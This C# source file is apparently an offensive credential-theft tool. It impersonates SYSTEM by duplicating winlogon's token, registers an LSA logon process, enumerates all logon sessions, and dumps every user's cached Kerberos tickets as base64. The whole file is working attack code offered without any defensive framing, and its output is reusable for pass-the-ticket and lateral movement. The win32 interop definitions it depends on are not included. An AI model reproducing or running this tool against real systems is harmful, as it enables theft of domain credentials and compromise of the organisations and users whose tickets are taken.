using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

class Program
{    static void Main(string[] args)
    {        Console.WriteLine("Starting Kerberos ticket extraction process...");
        
        try
        {
            var ticketDumper = new KerberosTicketDumper();
            ticketDumper.DumpTickets();
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Critical error: {ex.Message}");
            Console.WriteLine(ex.StackTrace);
        }
        
        Console.WriteLine("Process completed.");
    }
}

public class KerberosTicketDumper
{
    private IntPtr tokenHandle = IntPtr.Zero;
    private IntPtr dupTokenHandle = IntPtr.Zero;
    private IntPtr lsaHandle = IntPtr.Zero;

    public void DumpTickets()
    {        try
        {
            if (!ImpersonateSystem())
            {
                Console.WriteLine("[-] Could not impersonate as SYSTEM");
                return;
            }

            if (!InitializeLSA())
            {
                Console.WriteLine("[-] Could not initialize LSA");
                return;
            }

            ProcessLogonSessions();
        }
        finally
        {
            Cleanup();
        }
    }
    private bool ImpersonateSystem()
    {
        // Get token from winlogon process
        var winlogonProcesses = Process.GetProcessesByName("winlogon");
        if (winlogonProcesses.Length == 0)
        {
            Console.WriteLine("[-] Winlogon process not found");
            return false;
        }

        var winlogon = winlogonProcesses[0];
        Console.WriteLine($"[+] Winlogon process found (PID: {winlogon.Id})");
        try
        {
            // Get process token
            bool status = win32.OpenProcessToken(winlogon.Handle, win32.TOKEN_QUERY | win32.TOKEN_DUPLICATE, out tokenHandle);
            if (!status)
            {
                Console.WriteLine($"[-] Error performing OpenProcessToken: {Marshal.GetLastWin32Error()}");
                return false;
            }
            Console.WriteLine("[+] Token obtained successfully");

            // Duplicate token
            status = win32.DuplicateTokenEx(tokenHandle, win32.MAXIMUM_ALLOWED, IntPtr.Zero,
                win32.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                win32.TOKEN_TYPE.TokenPrimary, out dupTokenHandle);
            if (!status)
            {
                Console.WriteLine($"[-] Error performing DuplicateTokenEx: {Marshal.GetLastWin32Error()}");
                return false;
            }
            Console.WriteLine("[+] Token duplicated successfully");

            // Impersonate SYSTEM user
            status = win32.ImpersonateLoggedOnUser(dupTokenHandle);
            if (!status)
            {
                Console.WriteLine($"[-] Error impersonating user: {Marshal.GetLastWin32Error()}");
                return false;
            }
            string? currentUser = null;
            try
            {
                currentUser = WindowsIdentity.GetCurrent().Name;
            }
            catch (PlatformNotSupportedException)
            {
                Console.WriteLine("[-] Error: Functionality not supported on this platform");
                return false;
            }

            Console.WriteLine($"[+] Current user: {currentUser}");

            if (currentUser != "NT AUTHORITY\\SYSTEM")
            {
                Console.WriteLine("[-] Error: Could not impersonate as SYSTEM");
                return false;
            }
            Console.WriteLine("[+] Successfully impersonated as SYSTEM");
            return true;
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[-] Error during impersonation: {ex.Message}");
            return false;
        }
    }
    private bool InitializeLSA()
    {
        try
        {
            // Register LSA logon process
            win32.LSA_STRING_IN LSAString;
            var LogonProcessName = "User32LogonProcess";

            LSAString.Length = (ushort)LogonProcessName.Length;
            LSAString.MaximumLength = (ushort)(LogonProcessName.Length + 1);
            LSAString.buffer = Marshal.StringToHGlobalAnsi(LogonProcessName);

            var ret = win32.LsaRegisterLogonProcess(LSAString, out lsaHandle, out _);
            if (ret != 0)
            {
                Console.WriteLine($"[-] Error in LsaRegisterLogonProcess: {ret}");
                return false;
            }
            Console.WriteLine("[+] LSA Process registered successfully");

            // Look up Kerberos authentication package
            UInt32 authPackage;
            var krbname = "kerberos";
            LSAString.Length = (ushort)krbname.Length;
            LSAString.MaximumLength = (ushort)(krbname.Length + 1);
            LSAString.buffer = Marshal.StringToHGlobalAnsi(krbname);

            var retcode = win32.LsaLookupAuthenticationPackage(lsaHandle, ref LSAString, out authPackage);
            if (retcode != 0)
            {
                Console.WriteLine($"[-] Error looking up Kerberos authentication package: {retcode}");
                return false;
            }
            Console.WriteLine("[+] Kerberos authentication package found");

            this.authPackage = authPackage;
            return true;
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[-] Error during LSA initialization: {ex.Message}");
            return false;
        }
    }

    private uint authPackage;

    private void ProcessLogonSessions()
    {
        uint count;
        IntPtr luidPtr;
        var ret = win32.LsaEnumerateLogonSessions(out count, out luidPtr);
        if (ret != 0)
        {
            Console.WriteLine($"[-] Could not enumerate logon sessions: {ret}");
            return;
        }

        Console.WriteLine($"[+] Logon sessions found: {count}");
        
        List<win32.LUID> luids = new List<win32.LUID>();
        IntPtr currentPtr = luidPtr;
        
        for (var i = 0; i < count; i++)
        {
            win32.LUID luid = Marshal.PtrToStructure<win32.LUID>(currentPtr);
            luids.Add(luid);
            currentPtr = (IntPtr)(currentPtr.ToInt64() + Marshal.SizeOf<win32.LUID>());
        }

        win32.LsaFreeReturnBuffer(luidPtr);

        int ticketCount = 0;
        foreach (win32.LUID luid in luids)
        {
            try
            {
                var sessionTickets = ProcessSession(luid);
                ticketCount += sessionTickets;
            }

            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error processing session {luid.LowPart}: {ex.Message}");
            }
        }
        
        Console.WriteLine($"[+] Total tickets processed: {ticketCount}");
    }

    private int ProcessSession(win32.LUID luid)
    {
        IntPtr luidPtr = Marshal.AllocHGlobal(Marshal.SizeOf(luid));
        IntPtr sessionDataPtr = IntPtr.Zero;
        int ticketCount = 0;

        try
        {
            Marshal.StructureToPtr(luid, luidPtr, false);
              uint retGetLogon = win32.LsaGetLogonSessionData(luidPtr, out sessionDataPtr);
            if (retGetLogon != 0 || sessionDataPtr == IntPtr.Zero)
            {
                return 0; // Invalid session, continue with next
            }

            win32.SECURITY_LOGON_SESSION_DATA unsafeData = Marshal.PtrToStructure<win32.SECURITY_LOGON_SESSION_DATA>(sessionDataPtr);
            win32.LogonSessionData logonSessionData = new win32.LogonSessionData
            {
                AuthenticationPackage = Marshal.PtrToStringUni(unsafeData.AuthenticationPackage.buffer, unsafeData.AuthenticationPackage.Length / 2),
                DnsDomainName = Marshal.PtrToStringUni(unsafeData.DnsDomainName.buffer, unsafeData.DnsDomainName.Length / 2),
                LogonID = unsafeData.LogonID,
                LogonTime = DateTime.FromFileTime((long)unsafeData.LogonTime),
                LogonServer = Marshal.PtrToStringUni(unsafeData.LogonServer.buffer, unsafeData.LogonServer.Length / 2),
                logonType = (win32.LogonType)unsafeData.logontype,
                username = Marshal.PtrToStringUni(unsafeData.username.buffer, unsafeData.username.Length / 2),
                LogonDomain = Marshal.PtrToStringUni(unsafeData.LogonDomain.buffer, unsafeData.LogonDomain.Length / 2)
            };            // Only process sessions with valid users
            if (string.IsNullOrEmpty(logonSessionData.username) || 
                logonSessionData.username.EndsWith("$") ||
                logonSessionData.logonType == win32.LogonType.UndefinedLogonType)
            {
                return 0;
            }

            ticketCount = ProcessTicketCache(luid, logonSessionData);
        }
        finally
        {
            if (sessionDataPtr != IntPtr.Zero)
                win32.LsaFreeReturnBuffer(sessionDataPtr);
            if (luidPtr != IntPtr.Zero)
                Marshal.FreeHGlobal(luidPtr);
        }

        return ticketCount;
    }

    private int ProcessTicketCache(win32.LUID luid, win32.LogonSessionData logonSessionData)
    {
        win32.KERB_QUERY_TKT_CACHE_REQUEST ticketCacheRequest = new win32.KERB_QUERY_TKT_CACHE_REQUEST
        {
            MessageType = win32.KERB_PROTOCOL_MESSAGE_TYPE.KerbQueryTicketCacheExMessage,
            LogonId = luid
        };

        IntPtr tQueryPtr = Marshal.AllocHGlobal(Marshal.SizeOf(ticketCacheRequest));
        IntPtr ticketsPointer = IntPtr.Zero;
        int ticketCount = 0;

        try
        {
            Marshal.StructureToPtr(ticketCacheRequest, tQueryPtr, false);
            
            var retcode = win32.LsaCallAuthenticationPackage(lsaHandle, authPackage, tQueryPtr, 
                Marshal.SizeOf(ticketCacheRequest), out ticketsPointer, out ulong returnBufferLength, out int protocolStatus);

            if (retcode != 0 || ticketsPointer == IntPtr.Zero)
            {
                return 0;
            }

            win32.KERB_QUERY_TKT_CACHE_RESPONSE ticketCacheResponse = Marshal.PtrToStructure<win32.KERB_QUERY_TKT_CACHE_RESPONSE>(ticketsPointer);
            var count = ticketCacheResponse.CountOfTickets;

            if (count == 0)
            {
                return 0;
            }            Console.WriteLine($"\n[+] User: {logonSessionData.username}@{logonSessionData.LogonDomain}");
            
            Console.WriteLine($"[+] Tickets found: {count}");

            var ticketInfo = new win32.KERB_TICKET_CACHE_INFO_EX();
            int dataSize = Marshal.SizeOf(ticketInfo.GetType());

            for (var j = 0; j < count; j++)
            {
                try
                {
                    IntPtr currTicketPtr = (IntPtr)(ticketsPointer.ToInt64() + (8 + j * dataSize));
                    win32.KERB_TICKET_CACHE_INFO_EX ticketResult = Marshal.PtrToStructure<win32.KERB_TICKET_CACHE_INFO_EX>(currTicketPtr);
                    
                    DisplayTicketInfo(logonSessionData, ticketResult);
                    ExtractTicket(luid, ticketResult);
                    ticketCount++;
                }                catch (Exception ex)
                {
                    Console.WriteLine($"[-] Error processing ticket {j}: {ex.Message}");
                }
            }
        }
        finally
        {
            if (ticketsPointer != IntPtr.Zero)
                win32.LsaFreeReturnBuffer(ticketsPointer);
            if (tQueryPtr != IntPtr.Zero)
                Marshal.FreeHGlobal(tQueryPtr);
        }

        return ticketCount;
    }

    private void DisplayTicketInfo(win32.LogonSessionData logonSessionData, win32.KERB_TICKET_CACHE_INFO_EX ticketResult)
    {
        Console.WriteLine("\n-----------------------------------------------------------------------");
        Console.WriteLine($"Username = {logonSessionData.username}");
        Console.WriteLine($"DnsDomainName = {logonSessionData.DnsDomainName}");
        Console.WriteLine($"LogonDomain = {logonSessionData.LogonDomain}");
        Console.WriteLine($"logonType = {logonSessionData.logonType}");
        Console.WriteLine($"AuthenticationPackage = {logonSessionData.AuthenticationPackage}");
        Console.WriteLine($"StartTime ---> {DateTime.FromFileTime(ticketResult.StartTime)}");
        Console.WriteLine($"EndTime ---> {DateTime.FromFileTime(ticketResult.EndTime)}");
        Console.WriteLine($"Renew Time ---> {DateTime.FromFileTime(ticketResult.RenewTime)}");
        Console.WriteLine($"TicketFlags ---> {(win32.TicketFlags)ticketResult.TicketFlags}");
        Console.WriteLine($"Encryption Type ---> {(win32.EncTypes)ticketResult.EncryptionType}");
        Console.WriteLine($"Server Name ---> {Marshal.PtrToStringUni(ticketResult.ServerName.Buffer, ticketResult.ServerName.Length / 2)}");
        Console.WriteLine($"Server Realm ---> {Marshal.PtrToStringUni(ticketResult.ServerRealm.Buffer, ticketResult.ServerRealm.Length / 2)}");
        Console.WriteLine($"Client Name ---> {Marshal.PtrToStringUni(ticketResult.ClientName.Buffer, ticketResult.ClientName.Length / 2)}");
        Console.WriteLine($"Client Realm ---> {Marshal.PtrToStringUni(ticketResult.ClientRealm.Buffer, ticketResult.ClientRealm.Length / 2)}");
    }

    private void ExtractTicket(win32.LUID luid, win32.KERB_TICKET_CACHE_INFO_EX ticketResult)
    {
        IntPtr responsePointer = IntPtr.Zero;
        IntPtr unmanagedAddr = IntPtr.Zero;

        try
        {
            win32.KERB_RETRIEVE_TKT_REQUEST request = new win32.KERB_RETRIEVE_TKT_REQUEST
            {
                MessageType = win32.KERB_PROTOCOL_MESSAGE_TYPE.KerbRetrieveEncodedTicketMessage,
                LogonId = luid,
                TicketFlags = 0x0,
                CacheOptions = 0x8,
                EncryptionType = 0x0
            };

            string serverName = Marshal.PtrToStringUni(ticketResult.ServerName.Buffer, ticketResult.ServerName.Length / 2);
            win32.UNICODE_STRING tname = new win32.UNICODE_STRING
            {
                Length = (ushort)(serverName.Length * 2),
                MaximumLength = (ushort)(serverName.Length * 2 + 2),
                Buffer = Marshal.StringToHGlobalUni(serverName)
            };
            request.TargetName = tname;

            var structSize = Marshal.SizeOf(request.GetType());
            int newStructSize = structSize + tname.MaximumLength;
            unmanagedAddr = Marshal.AllocHGlobal(newStructSize);

            Marshal.StructureToPtr(request, unmanagedAddr, false);

            IntPtr newTargetNameBuffPtr = (IntPtr)(unmanagedAddr.ToInt64() + structSize);
            win32.CopyMemory(newTargetNameBuffPtr, tname.Buffer, tname.MaximumLength);

            int size = IntPtr.Size == 8 ? 24 : 16;
            Marshal.WriteIntPtr(unmanagedAddr, size, newTargetNameBuffPtr);

            var retcode = win32.LsaCallAuthenticationPackage(lsaHandle, authPackage, unmanagedAddr, newStructSize, 
                out responsePointer, out ulong returnBufferLength, out int protocolStatus);

            if (retcode == 0 && returnBufferLength != 0)
            {
                win32.KERB_RETRIEVE_TKT_RESPONSE response = Marshal.PtrToStructure<win32.KERB_RETRIEVE_TKT_RESPONSE>(responsePointer);
                var encodeTicketSize = response.Ticket.EncodedTicketSize;
                byte[] EncodedTicket = new byte[encodeTicketSize];

                Marshal.Copy(response.Ticket.EncodedTicket, EncodedTicket, 0, encodeTicketSize);

                Console.WriteLine($"Ticket b64 ---> {Convert.ToBase64String(EncodedTicket)}");
                Console.WriteLine($"EncType ---> {(win32.EncTypes)response.Ticket.SessionKey.KeyType}");
            }            else
            {
                Console.WriteLine($"[-] Error extracting ticket: {retcode}, ProtocolStatus: {protocolStatus}");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[-] Error in ExtractTicket: {ex.Message}");
        }
        finally
        {
            if (responsePointer != IntPtr.Zero)
                win32.LsaFreeReturnBuffer(responsePointer);
            if (unmanagedAddr != IntPtr.Zero)
                Marshal.FreeHGlobal(unmanagedAddr);
        }

        Console.WriteLine("-----------------------------------------------------------------------\n");
    }

    private void Cleanup()
    {
        try
        {
            if (tokenHandle != IntPtr.Zero)
            {
                win32.CloseHandle(tokenHandle);
                tokenHandle = IntPtr.Zero;
            }

            if (dupTokenHandle != IntPtr.Zero)
            {
                win32.CloseHandle(dupTokenHandle);
                dupTokenHandle = IntPtr.Zero;
            }

            if (lsaHandle != IntPtr.Zero)
            {
                win32.LsaDeregisterLogonProcess(lsaHandle);
                lsaHandle = IntPtr.Zero;
            }            Console.WriteLine("[+] Resources cleaned up successfully");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[-] Error during cleanup: {ex.Message}");
        }
    }
}